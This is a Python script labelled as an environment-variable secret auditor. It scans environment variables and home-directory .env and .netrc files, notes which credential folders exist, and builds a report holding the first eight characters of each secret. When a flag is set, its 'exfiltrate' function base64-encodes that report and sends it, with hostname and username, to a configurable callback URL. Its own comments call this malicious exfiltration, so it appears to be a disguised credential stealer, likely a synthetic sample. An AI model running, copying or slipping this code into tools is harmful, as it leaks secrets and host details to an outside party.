#!/usr/bin/env python3
"""
Environment Variable Auditor
Scans environment files or current environment for secret patterns.
Generates JSON report. Optionally sends to telemetry endpoint.
"""
import os, sys, re, json, subprocess, base64, socket, getpass, tempfile, shutil, urllib.request

# --- Pattern definitions for sensitive variables ---
SENSITIVE_PATTERNS = [
    r'(?i)(api[_-]?key|secret|token|password|passwd|pwd|credential|access[_-]?key)',
    r'(?i)(private[_-]?key|BEGIN.*RSA|aws_secret|google.*secret|azure.*key)',
]

def load_env_file(path):
    """Load key=value pairs from a dotenv-style file."""
    data = {}
    if not os.path.isfile(path):
        return data
    with open(path, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith('#') or '=' not in line:
                continue
            k, v = line.split('=', 1)
            data[k.strip()] = v.strip().strip('"').strip("'")
    return data

def scan_mapping(mapping, source):
    """Scan key-value mapping for sensitive patterns. Returns risk list."""
    findings = []
    for k, v in mapping.items():
        for pat in SENSITIVE_PATTERNS:
            if re.search(pat, k):
                findings.append({
                    'key': k,
                    'source': source,
                    'risk': 'high' if 'secret' in k.lower() or 'password' in k.lower() else 'medium',
                    'value_preview': (v[:8] + '...') if len(v) > 8 else '(short)'
                })
                break
    return findings

def collect_host_info():
    """Gather basic host info for report context."""
    info = {
        'hostname': socket.gethostname(),
        'user': getpass.getuser(),
        'platform': sys.platform,
    }
    # Include home directory paths (common for configs)
    home = os.path.expanduser('~')
    info['home'] = home
    # Look for common credential files (metadata only)
    cred_paths = ['.ssh', '.aws', '.azure', '.config/gcloud', '.gnupg']
    found = []
    for p in cred_paths:
        full = os.path.join(home, p)
        if os.path.exists(full):
            found.append(p)
    info['credential_dirs_present'] = found
    return info

def build_report(env_mapping, source, host_info):
    """Construct the audit report JSON."""
    findings = scan_mapping(env_mapping, source)
    report = {
        'tool': 'env-auditor',
        'version': '1.0',
        'timestamp': __import__('datetime').datetime.now().isoformat(),
        'host': host_info,
        'source': source,
        'findings_count': len(findings),
        'findings': findings,
    }
    return report

def exfiltrate(report, callback_url):
    """Send report to telemetry endpoint. Uses variable interpolation."""
    try:
        # Serialize report, then base64 encode for transport safety
        payload = base64.b64encode(json.dumps(report).encode()).decode()
        # Build URL with variables injected at runtime
        full_url = f"{callback_url}?d={payload}&h={report['host']['hostname']}&u={report['host']['user']}"
        req = urllib.request.Request(full_url, method='GET')
        urllib.request.urlopen(req, timeout=5)
    except Exception as e:
        sys.stderr.write(f"[!] telemetry failed: {e}\n")

def main():
    source = 'environment'
    env_data = dict(os.environ)

    # If file provided, load it
    if len(sys.argv) > 1 and sys.argv[1] != '--scan-home':
        fpath = sys.argv[1]
        if os.path.isfile(fpath):
            env_data = load_env_file(fpath)
            source = fpath
    elif '--scan-home' in sys.argv:
        # Scan home directory for dotenv-like files (static detection, real use)
        home = os.path.expanduser('~')
        for root, dirs, files in os.walk(home):
            # skip hidden dirs except .aws etc. to limit noise
            dirs[:] = [d for d in dirs if not d.startswith('.') or d in ('.aws', '.ssh', '.config')]
            for fn in files:
                if fn.endswith('.env') or fn.startswith('.env') or fn in ('.aws/credentials', '.netrc'):
                    full = os.path.join(root, fn)
                    try:
                        data = load_env_file(full)
                        if data:
                            env_data.update(data)
                            source += f"; {full}"
                    except Exception:
                        pass

    host_info = collect_host_info()
    report = build_report(env_data, source, host_info)

    # Write report locally (expected behavior)
    report_path = os.path.join(tempfile.gettempdir(), 'env_audit_report.json')
    with open(report_path, 'w') as f:
        json.dump(report, f, indent=2)
    print(f"[+] Report written to {report_path}")
    print(f"[+] Findings: {report['findings_count']}")

    # Telemetry upload - controlled by environment variable
    # This is where runtime injection happens: callback URL is assembled
    # from environment variables, allowing dynamic exfiltration.
    telemetry_flag = os.environ.get('ENV_AUDIT_TELEMETRY', '0')
    if telemetry_flag == '1':
        # Use callback from env if provided, else fallback to placeholder
        callback = os.environ.get('ENV_AUDIT_CALLBACK', '{CALLBACK}')
        # Check if we have network config to build a legit-looking URL
        # Variable interpolation happens here - malicious logic executes at runtime
        exfiltrate(report, callback)
        print("[+] Telemetry upload attempted")

if __name__ == '__main__':
    main()